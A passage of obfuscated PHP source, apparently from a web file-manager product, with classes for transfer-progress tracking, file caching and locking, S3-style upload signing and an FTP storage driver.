$this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Åô€Ú‹) { } public function sourceAddHashEnd($Â¯§ª»è) { } public function sourceAddFileStart($øôåàÌœ) { $›ÜıËÖÎ =& $_SERVER[•€áå–Õ]; $è®ÈÚ =& $this->task; $è®ÈÚ[$›ÜıËÖÎ[1746]] = $øôåàÌœ[$›ÜıËÖÎ[88]]; $è®ÈÚ[$›ÜıËÖÎ[1744]] = $øôåàÌœ[$›ÜıËÖÎ[42]]; $è®ÈÚ[$›ÜıËÖÎ[1105]] = $øôåàÌœ[$›ÜıËÖÎ[42]]; $è®ÈÚ[$›ÜıËÖÎ[1757]] = $øôåàÌœ[$›ÜıËÖÎ[96]]; $this->update(); } public function sourceAddFileEnd($äòÄ»Ù) { $ƒ‘¤¸ ê =& $_SERVER[•€áå–Õ]; $ëóÌõğé =& $this->task; $ëóÌõğé[$ƒ‘¤¸ ê[1751]] += $äòÄ»Ù[$ƒ‘¤¸ ê[88]]; $ëóÌõğé[$ƒ‘¤¸ ê[1757]] = $äòÄ»Ù[$ƒ‘¤¸ ê[96]]; $this->update(1); } public function copyFileStart($Ú”„’Œ½, $ˆîËÇ¯, $ö²ÅšŞ…, $•‹äé…Â, $ŠñØ¥ê, $Ã°ü‹íâ) { $Ü „€Šè =& $_SERVER[•€áå–Õ]; $öŸïŠ = $ŠñØ¥ê; if ($öŸïŠ == $GLOBALS[$Ü „€Šè[1758]]) { $öŸïŠ = $GLOBALS[$Ü „€Šè[1759]]; } $GLOBALS[$Ü „€Šè[1759]] = $ŠñØ¥ê; $GLOBALS[$Ü „€Šè[1758]] = $Ã°ü‹íâ; $»®šø„… =& $this->task; $»®šø„…[$Ü „€Šè[1744]] = $öŸïŠ; $»®šø„…[$Ü „€Šè[1746]] = (int) $Ú”„’Œ½->size($ˆîËÇ¯); $»®šø„…[$Ü „€Šè[1747]] = 0; $»®šø„…[$Ü „€Šè[1105]] = $Ü „€Šè[22]; $»®šø„…[$Ü „€Šè[1748]] = $Ü „€Šè[22]; $»®šø„…[$Ü „€Šè[1749]] = 0; $ÆæÍÎ¼¦ = $»®šø„…[$Ü „€Šè[1746]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($»®šø„…[$Ü „€Šè[454]] . $Ü „€Šè[1760]); if ($ÆæÍÎ¼¦ && file_exists(get_path_father($•‹äé…Â))) { Cache::set($»®šø„…[$Ü „€Šè[454]] . $Ü „€Šè[1760], $•‹äé…Â); $»®šø„…[$Ü „€Šè[1717]] = array($Ü „€Šè[1761], $Ü „€Šè[1762]); } $this->update(0, $ÆæÍÎ¼¦); } public static function updateCopyLocalFileSize($ûÈİšÃÙ) { $«Ï“øò =& $_SERVER[•€áå–Õ]; $şŸ½ßü = Cache::get($ûÈİšÃÙ[$«Ï“øò[454]] . $«Ï“øò[1760]); if (!$şŸ½ßü || !file_exists($şŸ½ßü)) { return $ûÈİšÃÙ; } $ûÈİšÃÙ[$«Ï“øò[1747]] = @filesize($şŸ½ßü); $ûÈİšÃÙ[$«Ï“øò[1751]] += $ûÈİšÃÙ[$«Ï“øò[1747]]; self::updateTask($ûÈİšÃÙ); return $ûÈİšÃÙ; } public function copyFileEnd($¬›äÊñ, $°Ãç•²”, $›‹é¸øĞ, $ˆ›Ê¼èø, $ı‹ˆªœ, $ÉÀÕİäÆ) { $÷ÉÒ‹ˆ =& $_SERVER[•€áå–Õ]; $ïÆüŸ£Æ =& $this->task; $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1747]] = $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1746]]; $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1748]] = $÷ÉÒ‹ˆ[22]; unset($ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1717]]); if ($ı‹ˆªœ == $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1744]]) { $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1750]] += $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1746]]; $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1751]] = $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1750]]; $Õì–Òñ = 1; if (isset($ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1757]]) && $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1757]] == $°Ãç•²”) { $Õì–Òñ = 0; } $this->update($Õì–Òñ); } else { $this->update(); $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1747]] = 0; } Cache::remove($ïÆüŸ£Æ[$÷ÉÒ‹ˆ[454]] . $÷ÉÒ‹ˆ[1760]); self::log($÷ÉÒ‹ˆ[1763] . $°Ãç•²” . $÷ÉÒ‹ˆ[82] . $ˆ›Ê¼èø . $÷ÉÒ‹ˆ[12] . $ı‹ˆªœ . $÷ÉÒ‹ˆ[1764] . $ïÆüŸ£Æ[$÷ÉÒ‹ˆ[1744]]); } public function updateFileEnd($™–ŸÎ«¿, $æÂš¹”») { $Ãò‹”Úµ =& $_SERVER[•€áå–Õ]; $ª¿ÇÂçş =& $this->task; $ª¿ÇÂçş[$Ãò‹”Úµ[1744]] = $™–ŸÎ«¿; $ª¿ÇÂçş[$Ãò‹”Úµ[1746]] = $æÂš¹”»; $ª¿ÇÂçş[$Ãò‹”Úµ[1750]] += $æÂš¹”»; $ª¿ÇÂçş[$Ãò‹”Úµ[1751]] = $ª¿ÇÂçş[$Ãò‹”Úµ[1750]]; $this->update(1); self::log($Ãò‹”Úµ[1765] . $™–ŸÎ«¿); } public function sourceModelCopy($®ıøãŒ) { $Ò”©º™§ =& $_SERVER[•€áå–Õ]; $ş Ö½éÌ = $®ıøãŒ[0]; $Éá‡­ñ­ = $®ıøãŒ[1]; $£İÉ’’ =& $this->task; $this->sourceModelCopyFlag = !0; $ù‹Ÿ¯‹˜ = 0; switch ($ş Ö½éÌ) { case $Ò”©º™§[614]: $ù‹Ÿ¯‹˜ = 1; break; case $Ò”©º™§[617]: $£İÉ’’[$Ò”©º™§[1744]] = $Éá‡­ñ­[$Ò”©º™§[42]]; break; case $Ò”©º™§[619]: $ù‹Ÿ¯‹˜ = intval($®ıøãŒ[$Ò”©º™§[435]] * 0.4); break; case $Ò”©º™§[621]: $ù‹Ÿ¯‹˜ = intval($®ıøãŒ[$Ò”©º™§[435]] * 0.2); break; case $Ò”©º™§[623]: $ù‹Ÿ¯‹˜ = intval($®ıøãŒ[$Ò”©º™§[435]] * 0.4); break; } $this->update($ù‹Ÿ¯‹˜); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ˆ¬ùÎï, $ù«ù¶Í°) { $¯Ú¼œ’ñ =& $_SERVER[•€áå–Õ]; $this->sourceModelCopyFlag = !0; $¾»§½Å× = 1; if (isset($ˆ¬ùÎï[$¯Ú¼œ’ñ[91]])) { $¾»§½Å× = $ˆ¬ùÎï[$¯Ú¼œ’ñ[91]][$¯Ú¼œ’ñ[89]]; $¾»§½Å× = $¾»§½Å× + $ˆ¬ùÎï[$¯Ú¼œ’ñ[91]][$¯Ú¼œ’ñ[90]] + 1; } $this->update($¾»§½Å×); $this->sourceModelCopyFlag = !1; } public function sourceMove($½õç·¥») { $this->sourceRemove($½õç·¥», !1); } public function curlProgress($Ó§ÎŠí, $¯†Ø¾Íñ, $´£éÚ±®, $€÷¶á¬, $Ã„úŸì) { $õâÒ =& $_SERVER[•€áå–Õ]; $“ÈãüŸğ =& $this->task; if ($Ã„úŸì > 0) { $“ÈãüŸğ[$õâÒ[1105]] = $õâÒ[1766]; $“ÈãüŸğ[$õâÒ[1748]] = $õâÒ[119]; if ($“ÈãüŸğ[$õâÒ[1746]]) { $“ÈãüŸğ[$õâÒ[1747]] = $Ã„úŸì; } if ($“ÈãüŸğ[$õâÒ[1749]]) { $“ÈãüŸğ[$õâÒ[1747]] = $Ã„úŸì + $“ÈãüŸğ[$õâÒ[1749]]; } } else { if ($´£éÚ±® > 0) { if ($“ÈãüŸğ[$õâÒ[1746]] == $¯†Ø¾Íñ) { $“ÈãüŸğ[$õâÒ[1747]] = $´£éÚ±®; $“ÈãüŸğ[$õâÒ[1105]] = $õâÒ[1767]; $“ÈãüŸğ[$õâÒ[1748]] = $õâÒ[1235]; } } } $this->update(); } public function curlProgressStart($î¶ÃÍÌ) { } public function curlProgressEnd($ÚæƒŞ˜) { $½ª‹â¡ =& $_SERVER[•€áå–Õ]; $÷Öá¬î³ =& $this->task; $éû³í˜Ò = curl_getinfo($ÚæƒŞ˜); $İ‚½±Í = $éû³í˜Ò[$½ª‹â¡[1768]]; if ($İ‚½±Í == -1) { $İ‚½±Í = $éû³í˜Ò[$½ª‹â¡[1769]]; } if ($÷Öá¬î³[$½ª‹â¡[1748]] == $½ª‹â¡[119] && $İ‚½±Í) { $÷Öá¬î³[$½ª‹â¡[1749]] += $İ‚½±Í; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $šª½¤¶¶ =& $_SERVER[•€áå–Õ]; $œàÅ•‡  =& $this->task; $œàÅ•‡ [$šª½¤¶¶[1770]] = 1; Hook::bind($šª½¤¶¶[1738], array($this, $šª½¤¶¶[1771])); Hook::bind($šª½¤¶¶[1740], array($this, $šª½¤¶¶[1772])); Hook::bind($šª½¤¶¶[1742], array($this, $šª½¤¶¶[1773])); } protected function endAfter() { $ÓÔ‰˜¡í =& $_SERVER[•€áå–Õ]; Hook::unbind($ÓÔ‰˜¡í[1738], array($this, $ÓÔ‰˜¡í[1771])); Hook::unbind($ÓÔ‰˜¡í[1740], array($this, $ÓÔ‰˜¡í[1772])); Hook::unbind($ÓÔ‰˜¡í[1742], array($this, $ÓÔ‰˜¡í[1773])); } public function progressStart($’ŒËñÔ) { $Í¾¸§÷€ =& $_SERVER[•€áå–Õ]; $òí·¿ŠÒ = curl_getinfo($’ŒËñÔ); self::log($Í¾¸§÷€[1774] . $òí·¿ŠÒ[$Í¾¸§÷€[362]]); self::valueSet($this->task[$Í¾¸§÷€[454]], $this->task); } public function progressEnd($éÏ ê‘î) { $–İôÎê =& $_SERVER[•€áå–Õ]; self::log($–İôÎê[1775] . $this->task[$–İôÎê[454]]); $this->end(); } public function progress($ÈÔÑˆË, $ØÄêÇŸÙ, $™Ôé—Àó, $¥¢â¬‘, $ÚëŞ¤ıÔ) { $Ëå´ÌÊá =& $_SERVER[•€áå–Õ]; $–Û°Î¸× =& $this->task; if ($ÚëŞ¤ıÔ > 0) { $–Û°Î¸×[$Ëå´ÌÊá[827]] = $–Û°Î¸×[$Ëå´ÌÊá[827]] == 0 ? $¥¢â¬‘ : $–Û°Î¸×[$Ëå´ÌÊá[827]]; $–Û°Î¸×[$Ëå´ÌÊá[1694]] = $ÚëŞ¤ıÔ; } else { if ($™Ôé—Àó > 0) { $–Û°Î¸×[$Ëå´ÌÊá[827]] = $–Û°Î¸×[$Ëå´ÌÊá[827]] == 0 ? $ØÄêÇŸÙ : $–Û°Î¸×[$Ëå´ÌÊá[827]]; $–Û°Î¸×[$Ëå´ÌÊá[1694]] = $™Ôé—Àó; } } $this->update(); self::log("\160\162\x6f\147\x72\145\163\163\110\164\x74\160\72\x64\157\167\x6e\72{$™Ôé—Àó}\x2f{$ØÄêÇŸÙ}\x3b\40\x75\x70\154\x6f\141\x64\72{$ÚëŞ¤ıÔ}\x2f{$¥¢â¬‘}\x3b"); } } goto C¼“‘ÇÌƒ; E…à¬Àò÷ß: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($§å ê½®, $å¸Èìë) { $éƒ¶ùå¤ =& $_SERVER[•€áå–Õ]; $this->cachePath = $§å ê½®[$éƒ¶ùå¤[96]]; $this->prefix = $éƒ¶ùå¤[876]; $this->cacheTime = $å¸Èìë; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($­•—·Ù) { $à—Ò®÷ =& $_SERVER[•€áå–Õ]; $­•—·Ù = str_replace(array($à—Ò®÷[877], $à—Ò®÷[109], $à—Ò®÷[85]), $à—Ò®÷[878], $­•—·Ù); return $this->cachePath . $à—Ò®÷[879] . $­•—·Ù . $à—Ò®÷[880]; } public function set($î¤×ƒòš, $½Ûµù°Ñ, $Æ×ºáğ¦ = false) { $Æ×ºáğ¦ = $Æ×ºáğ¦ ? $Æ×ºáğ¦ : $this->cacheTime; $ªîƒãçê = $this->getFile($î¤×ƒòš); if (file_put_contents($ªîƒãçê, $this->prefix . $½Ûµù°Ñ, LOCK_EX)) { @touch($ªîƒãçê, intval(time() + $Æ×ºáğ¦)); clearstatcache(); return !0; } @unlink($ªîƒãçê); return !1; } public function get($»Íü¨ƒû) { $¬ûœÉã = $this->getFile($»Íü¨ƒû); if (file_exists($¬ûœÉã) && filemtime($¬ûœÉã) < time()) { @unlink($¬ûœÉã); return !1; } $È†ÏÃÁ« = @file_get_contents($¬ûœÉã); return substr($È†ÏÃÁ«, strlen($this->prefix)); } public function remove($ªëè…È) { $ßú¬ª› = $this->getFile($ªëè…È); return @unlink($ßú¬ª›); } public function deleteAll() { $ÊÊÊâ§ =& $_SERVER[•€áå–Õ]; $”¤‘ ø‰ = scandir($this->cachePath); foreach ($”¤‘ ø‰ as $ã™«»Ê…) { $«é § = $this->cachePath . $ã™«»Ê…; if (strpos($«é §, $ÊÊÊâ§[880]) && strpos($«é §, $ÊÊÊâ§[881])) { @unlink($«é §); } } } public function clearTimeout() { $ª‰º‰èˆ =& $_SERVER[•€áå–Õ]; $ÌÌ¾‹¬Â = scandir($this->cachePath); foreach ($ÌÌ¾‹¬Â as $Ó½œ‰‚â) { $ì†àÕØ‘ = $this->cachePath . $Ó½œ‰‚â; if (strpos($ì†àÕØ‘, $ª‰º‰èˆ[880]) && strpos($ì†àÕØ‘, $ª‰º‰èˆ[881]) && filemtime($ì†àÕØ‘) < time()) { @unlink($ì†àÕØ‘); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $³Ì½¤¨‚ =& $_SERVER[•€áå–Õ]; if (self::$handle) { return self::$handle; } $¦Ç°Í¾Î = $GLOBALS[$³Ì½¤¨‚[16]][$³Ì½¤¨‚[404]]; self::$timeout = $¦Ç°Í¾Î[$³Ì½¤¨‚[882]] ? $¦Ç°Í¾Î[$³Ì½¤¨‚[882]] : 10; $×†•ƒå´ = _get($GLOBALS[$³Ì½¤¨‚[16]], $³Ì½¤¨‚[883]); $ÂòÕ´òÓ = $¦Ç°Í¾Î[$³Ì½¤¨‚[868]] ? $¦Ç°Í¾Î[$³Ì½¤¨‚[868]] : $³Ì½¤¨‚[226]; if ($ÂòÕ´òÓ == $³Ì½¤¨‚[31] && $×†•ƒå´ == $³Ì½¤¨‚[23]) { $ÂòÕ´òÓ = $³Ì½¤¨‚[226]; } switch ($ÂòÕ´òÓ) { case $³Ì½¤¨‚[871]: self::$handle = new CacheLockRedis(); break; case $³Ì½¤¨‚[872]: self::$handle = new CacheLockMemcached(); break; case $³Ì½¤¨‚[31]: self::$handle = new CacheLockDatabase(); break; case $³Ì½¤¨‚[226]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($³Ì½¤¨‚[884], $³Ì½¤¨‚[885]); } return self::$handle; } private static function key($‚şĞÎÇà) { return $_SERVER[•€áå–Õ][886] . Cache::key($‚şĞÎÇà); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¦€¹„ƒí = '') { self::$errorMsg = $¦€¹„ƒí; } public static function lockGlobal($˜ˆ²àˆ«, $Òßá±ñ‹) { return self::lock($˜ˆ²àˆ«, $Òßá±ñ‹, !0); } public static function lock($¨¿Í¨ÑÜ, $Ğš–Â¬È = false, $­…ØşŠ… = false) { $¨ëİÀ§¡ =& $_SERVER[•€áå–Õ]; $ş¿‘ù¨İ = self::init(); $Ø»¯É¥ = self::key($¨¿Í¨ÑÜ); $Ğš–Â¬È = $Ğš–Â¬È ? $Ğš–Â¬È : self::$timeout; $úîô§Ñš = timeFloat(); $‚ß“€Û™ = $ş¿‘ù¨İ->lock($Ø»¯É¥, $Ğš–Â¬È); $ıü’ÉÎÛ = timeFloat(); if (!$‚ß“€Û™) { $œíšÁ×û = "\x6c\x6f\143\x6b\40\x65\x72\162\x6f\x72\x3b\153\x65\171\x3d{$¨¿Í¨ÑÜ}\x3b\x74\151\x6d\x65\75{$Ğš–Â¬È}\x3b" . self::$errorMsg . $¨ëİÀ§¡[83] . get_caller_msg(); $•ƒÔ¸Ó¨ = LNG($¨ëİÀ§¡[887]) . "\x28{$Ğš–Â¬È}\x73\x29\x2e" . LNG($¨ëİÀ§¡[888]); $•ƒÔ¸Ó¨ .= $¨ëİÀ§¡[889]; if (is_string(self::$errorMsg) && self::$errorMsg) { $•ƒÔ¸Ó¨ = $•ƒÔ¸Ó¨ . $¨ëİÀ§¡[890] . self::$errorMsg; } write_log($¨ëİÀ§¡[891] . sprintf($¨ëİÀ§¡[892], timeFloat() - $úîô§Ñš) . $¨ëİÀ§¡[893] . $œíšÁ×û . $¨ëİÀ§¡[894] . error_get_last(), $¨ëİÀ§¡[885]); show_json($•ƒÔ¸Ó¨, !1); } if (!$­…ØşŠ…) { self::$lockItem[$Ø»¯É¥] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ŠşŸâ‚ = number_format(timeFloat() - $ıü’ÉÎÛ, 3); write_log($¨ëİÀ§¡[895] . $¨¿Í¨ÑÜ . $¨ëİÀ§¡[896] . $ŠşŸâ‚, $¨ëİÀ§¡[885]); } return $‚ß“€Û™; } public static function lockGet($©çÑ›æ´) { $áÎ­Š¥Ù = self::key($©çÑ›æ´); if (self::$lockItem[$áÎ­Š¥Ù]) { return self::$lockItem[$áÎ­Š¥Ù]; } return self::init()->lockGet($áÎ­Š¥Ù); } public static function unlock($·ä˜´ù¦) { $«÷¤®ùÃ =& $_SERVER[•€áå–Õ]; $Ô¸¥ûªÙ = self::key($·ä˜´ù¦); self::$lockItem[$Ô¸¥ûªÙ] = null; self::init()->unlock($Ô¸¥ûªÙ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($«÷¤®ùÃ[897] . $·ä˜´ù¦, $«÷¤®ùÃ[885]); } return; } public static function unlockRuntime() { $±ƒê´ıĞ =& $_SERVER[•€áå–Õ]; $ç°ßÀÔ¯ = self::init(); $¡×àç¤ì = !1; foreach (self::$lockItem as $ØÒàš°† => $¿€°ùââ) { if (!$¿€°ùââ) { continue; } $ç°ßÀÔ¯->unlock($ØÒàš°†); if (!$¡×àç¤ì) { $¡×àç¤ì = !0; write_log($±ƒê´ıĞ[898] . $ØÒàš°† . $±ƒê´ıĞ[83] . get_caller_msg(), $±ƒê´ıĞ[885]); continue; } write_log($±ƒê´ıĞ[898] . $ØÒàš°†, $±ƒê´ıĞ[885]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Ñí’„„š = number_format(timeFloat() - TIME_FLOAT, 3); write_log($±ƒê´ıĞ[899] . $Ñí’„„š . $±ƒê´ıĞ[900] . ACTION, $±ƒê´ıĞ[885]); } } public static function fileLock($Ş‡·¯İÑ) { $£”õ“Û” =& $_SERVER[•€áå–Õ]; if (!$GLOBALS[$£”õ“Û”[901]]) { $GLOBALS[$£”õ“Û”[901]] = array(); } $GLOBALS[$£”õ“Û”[901]][$Ş‡·¯İÑ] = !1; $­›Š·òÄ = fopen(DATA_PATH . $Ş‡·¯İÑ . $£”õ“Û”[902], $£”õ“Û”[903]); if (!$­›Š·òÄ) { return !1; } $GLOBALS[$£”õ“Û”[901]][$Ş‡·¯İÑ] = $­›Š·òÄ; if (flock($­›Š·òÄ, LOCK_EX)) { return !0; } self::unlock($Ş‡·¯İÑ); show_json($£”õ“Û”[904], !1); return !1; } public static function fileUnlock($§±Ğ¬õ) { $ Ò‡ÀãÚ =& $_SERVER[•€áå–Õ]; $ëÉñ¼‘å = $GLOBALS[$ Ò‡ÀãÚ[901]][$§±Ğ¬õ]; if (!$ëÉñ¼‘å) { return; } $GLOBALS[$ Ò‡ÀãÚ[901]][$§±Ğ¬õ] = !1; flock($ëÉñ¼‘å, LOCK_UN); fclose($ëÉñ¼‘å); } public static function fileUnlockAll() { $¸…ë‘ïê =& $_SERVER[•€áå–Õ]; if (!$GLOBALS[$¸…ë‘ïê[901]]) { return; } foreach ($GLOBALS[$¸…ë‘ïê[901]] as $éä®Í‚ => $®¶§µ‚Í) { if (!$®¶§µ‚Í) { continue; } $GLOBALS[$¸…ë‘ïê[901]][$éä®Í‚] = !1; flock($®¶§µ‚Í, LOCK_UN); fclose($®¶§µ‚Í); } $GLOBALS[$¸…ë‘ïê[901]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto DöÀÎ©à˜; Eã©Šİ¨ŒÕ: class PathDriverEDS extends PathDriverMinIO { public function __construct($§¿¿¯) { parent::__construct($§¿¿¯); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($·°‹Ö ²) { parent::__construct($·°‹Ö ²); $this->signatureVersion($_SERVER[•€áå–Õ][243]); } public function uploadFormData($Ï™èÉæÔ, $©„ĞÙà = 3600) { $üó”«±¹ =& $_SERVER[•€áå–Õ]; $îõİİÑİ = $üó”«±¹[225]; $üâÒ²ßÙ = $üó”«±¹[264]; $ÔŒìğÃÒ = $üó”«±¹[72]; $í—Ï—¹ = gmdate($üó”«±¹[265]); $óíŞ”Š‰ = gmdate($üó”«±¹[266]); $¤î¶¦†Ó = $üó”«±¹[267]; $¹Æ×¶û = $©„ĞÙà . $üó”«±¹[22]; $²Ë“Ø¼ = $üó”«±¹[268]; $Ñæ€‡íƒ = array($this->accessKey, $óíŞ”Š‰, $this->region, $ÔŒìğÃÒ, $¤î¶¦†Ó); $ßİ§ˆ¯Ğ = implode($üó”«±¹[18], $Ñæ€‡íƒ); $¡ëÃşÛ = array($üó”«±¹[269] => gmdate($üó”«±¹[1366], strtotime($üó”«±¹[271])), $üó”«±¹[272] => array(array($üó”«±¹[273] => $this->bucket), array($üó”«±¹[274] => $îõİİÑİ), array($üó”«±¹[275], $üó”«±¹[276], $üó”«±¹[22]), array($üó”«±¹[275], $üó”«±¹[277], $üó”«±¹[22]), array($üó”«±¹[275], $üó”«±¹[278], $üó”«±¹[22]), array($üó”«±¹[279] => $²Ë“Ø¼), array($üó”«±¹[280] => $ßİ§ˆ¯Ğ), array($üó”«±¹[281] => $üâÒ²ßÙ), array($üó”«±¹[282] => $í—Ï—¹), array($üó”«±¹[283] => $¹Æ×¶û))); $†ÛºÓû² = base64_encode(json_encode($¡ëÃşÛ)); $×Â¹æĞ© = hash_hmac($üó”«±¹[284], $óíŞ”Š‰, $üó”«±¹[285] . $this->secret, !0); $ş‹‡‡³ = hash_hmac($üó”«±¹[284], $this->region, $×Â¹æĞ©, !0); $£ğççî› = hash_hmac($üó”«±¹[284], $ÔŒìğÃÒ, $ş‹‡‡³, !0); $ŞØëì¸« = hash_hmac($üó”«±¹[284], $¤î¶¦†Ó, $£ğççî›, !0); $£×Ï¨Ë = hash_hmac($üó”«±¹[284], $†ÛºÓû², $ŞØëì¸«); $ç¥êüÌõ = array($üó”«±¹[242] => $üó”«±¹[22], $üó”«±¹[286] => $üó”«±¹[22], $üó”«±¹[274] => $îõİİÑİ, $üó”«±¹[279] => $²Ë“Ø¼, $üó”«±¹[287] => $†ÛºÓû², $üó”«±¹[288] => $ßİ§ˆ¯Ğ, $üó”«±¹[289] => $üâÒ²ßÙ, $üó”«±¹[290] => $í—Ï—¹, $üó”«±¹[291] => $¹Æ×¶û, $üó”«±¹[292] => $£×Ï¨Ë, $üó”«±¹[208] => $this->getHost()); return $ç¥êüÌõ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ı©«±Õ‚) { parent::__construct(); if (count($ı©«±Õ‚) > 0) { $this->_init($ı©«±Õ‚); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($€¬íÆ½¬) { $€Ğ£ú“Ç =& $_SERVER[•€áå–Õ]; global $config; $this->appCharset = $config[$€Ğ£ú“Ç[1392]]; $this->systemCharset = $config[$€Ğ£ú“Ç[1393]]; if (isset($€¬íÆ½¬[$€Ğ£ú“Ç[1394]]) && $€¬íÆ½¬[$€Ğ£ú“Ç[1394]]) { $this->systemCharset = $€¬íÆ½¬[$€Ğ£ú“Ç[1394]]; } } public function iconvApp($Â°À®¯) { return $this->iconvTo($Â°À®¯, $this->systemCharset, $this->appCharset); } public function iconvSystem($Ú–áµ·) { return $this->iconvTo($Ú–áµ·, $this->appCharset, $this->systemCharset); } public function getPathOuter($™–Îš‡Â) { $÷°»ñÙ¢ =& $_SERVER[•€áå–Õ]; $Œˆ“´Ï´ = $this->iconvApp($this->pathBase); $™–Îš‡Â = $this->iconvApp($™–Îš‡Â); if (substr($Œˆ“´Ï´, 0, 2) == $÷°»ñÙ¢[1395]) { $Œˆ“´Ï´ = BASIC_PATH . substr($Œˆ“´Ï´, 2); } if (substr($™–Îš‡Â, 0, 2) == $÷°»ñÙ¢[1395]) { $™–Îš‡Â = BASIC_PATH . substr($™–Îš‡Â, 2); } $Œˆ“´Ï´ = KodIO::clear($Œˆ“´Ï´); $™–Îš‡Â = KodIO::clear($™–Îš‡Â); $™–Îš‡Â = substr($™–Îš‡Â, strlen($Œˆ“´Ï´)); if (empty($this->pathDriver)) { return $™–Îš‡Â; } return $this->pathDriver . $÷°»ñÙ¢[18] . ltrim($™–Îš‡Â, $÷°»ñÙ¢[18]); } private function _init($Ã™•ùË = array()) { $ÍøËÑ£Š =& $_SERVER[•€áå–Õ]; if (!function_exists($ÍøËÑ£Š[1396])) { throw new Exception(LNG($ÍøËÑ£Š[1397])); } $this->config = $Ã™•ùË; $this->charsetReset($Ã™•ùË); foreach ($Ã™•ùË as $ì¶’æ => $ñí·ïöü) { if (isset($this->{$ì¶’æ})) { $this->{$ì¶’æ} = $ñí·ïöü; } } return $this->_login($Ã™•ùË); } private function _login($×òÈƒ´Ú) { $Ôç¯‚Ğ× =& $_SERVER[•€áå–Õ]; static $Ö“¶õËË = array(); $ÅÜ’áÂ = md5(json_encode($×òÈƒ´Ú)); if (isset($Ö“¶õËË[$ÅÜ’áÂ])) { foreach ($Ö“¶õËË[$ÅÜ’áÂ] as $ã÷‰³² => $¿Ò€š‡Â) { $this->{$ã÷‰³²} = $¿Ò€š‡Â; } return !0; } $“ÜÒ”á = parse_url(trim($this->server, $Ôç¯‚Ğ×[18])); $this->host = $“ÜÒ”á[$Ôç¯‚Ğ×[208]]; $øˆó·Øæ = isset($“ÜÒ”á[$Ôç¯‚Ğ×[207]]) && $“ÜÒ”á[$Ôç¯‚Ğ×[207]] == $Ôç¯‚Ğ×[1398] ? !0 : !1; $this->scheme = $øˆó·Øæ ? $Ôç¯‚Ğ×[1399] : $Ôç¯‚Ğ×[1400]; $this->port = isset($“ÜÒ”á[$Ôç¯‚Ğ×[209]]) ? $“ÜÒ”á[$Ôç¯‚Ğ×[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $¦¾¥äù = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ôïØ•úÉ = $this->pasv == $Ôç¯‚Ğ×[100] ? !0 : !1; @ftp_pasv($this->connect, $ôïØ•úÉ); $Ö“¶õËË[$ÅÜ’áÂ] = array($Ôç¯‚Ğ×[1401] => $this->connect, $Ôç¯‚Ğ×[208] => $this->host, $Ôç¯‚Ğ×[207] => $this->scheme, $Ôç¯‚Ğ×[209] => $this->port); return $¦¾¥äù; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($„ì÷‚­á, $–—ÄÓ„ƒ = '', $îÜÆ¹ïÛ = REPEAT_RENAME) { if ($this->setContent($„ì÷‚­á, $–—ÄÓ„ƒ)) { return $this->getPathOuter($„ì÷‚­á); } return !1; } public function mkdir($Š»®¶¯œ, $ê¼¸Òü¼ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Š»®¶¯œ = $this->iconvSystem($Š»®¶¯œ); if ($this->_isFolder($Š»®¶¯œ) || @ftp_mkdir($this->connect, $Š»®¶¯œ)) { return $this->getPathOuter($Š»®¶¯œ); } if (!$this->mkdir($this->pathFather($Š»®¶¯œ))) { return !1; } if ($Š»®¶¯œ = @ftp_mkdir($this->connect, $Š»®¶¯œ)) { return $this->getPathOuter($Š»®¶¯œ); } return !1; } public function copyFile($Í”Ìä€ğ, $Ûğååğ) { if (!$this->_isconn()) { return !1; } $³¶³œª = $this->pathThis($this->iconvSystem($Í”Ìä€ğ)); $ã™œƒ€£ = $this->tempFile($³¶³œª); $á»†‰˜ß = $this->iconvApp($ã™œƒ€£); $this->download($Í”Ìä€ğ, $á»†‰˜ß); $Á¤ü™‹Ë = $this->upload($Ûğååğ, $á»†‰˜ß); $this->tempFileRemve($ã™œƒ€£); return $Á¤ü™‹Ë; } public function moveFile($Ç¾Ğ‡ûğ, $óû¡êæ‚) { if (!$this->_isconn()) { return !1; } $Ç¾Ğ‡ûğ = $this->iconvSystem($Ç¾Ğ‡ûğ); $óû¡êæ‚ = $this->iconvSystem($óû¡êæ‚); $¸Ì×œø = @ftp_rename($this->connect, $Ç¾Ğ‡ûğ, $óû¡êæ‚); return $¸Ì×œø ? $this->getPathOuter($óû¡êæ‚) : !1; } public function delFile($°êÎë) { if (!$this->_isconn()) { return !1; } $°êÎë = $this->iconvSystem($°êÎë); return @ftp_delete($this->connect, 